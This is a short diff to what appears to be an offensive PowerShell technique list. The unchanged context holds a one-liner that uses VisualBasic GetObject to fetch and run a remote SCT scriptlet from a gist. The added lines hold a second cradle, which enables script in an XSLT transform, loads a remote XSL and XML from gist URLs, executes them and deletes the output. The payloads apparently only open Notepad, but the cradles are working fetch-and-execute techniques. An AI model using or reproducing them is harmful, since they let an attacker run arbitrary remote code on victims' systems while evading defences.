@@ -11,6 +11,10 @@ SCT Launch Execution Reflection.Assembly Via ( Microsoft.VisualBasic )
 
 [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::GetObject('script:https://gist.githubusercontent.com/SeemantBisht/043cd13e0efef9a4b9e4f24272669d4a/raw/61444755ce35af70323174c7acd93e343764b818/note_spawn.sct').Exec(0)
 
+XML Launch Execution Via Reader XML,Transform Object Powershell
+
+$s=New-Object System.Xml.Xsl.XsltSettings;$r=New-Object System.Xml.XmlUrlResolver;$s.EnableScript=1;$x=New-Object System.Xml.Xsl.XslCompiledTransform;$x.Load('https://gist.githubusercontent.com/SeemantBisht/fa25c69d12af2ab022aa0e0898debfa1/raw/9a9f3337b61e92a855bf30f27e546e3d9f30b0f0/xsl-notepad.xsl',$s,$r);$x.Transform('https://gist.githubusercontent.com/SeemantBisht/5ec1b5d59b362b82c5b8045d7c03bbd4/raw/803efb7a65252961d688888e5ed7f3b146852002/xsl-notepad.xml','z');del z;
+
 
 
 DNS Records
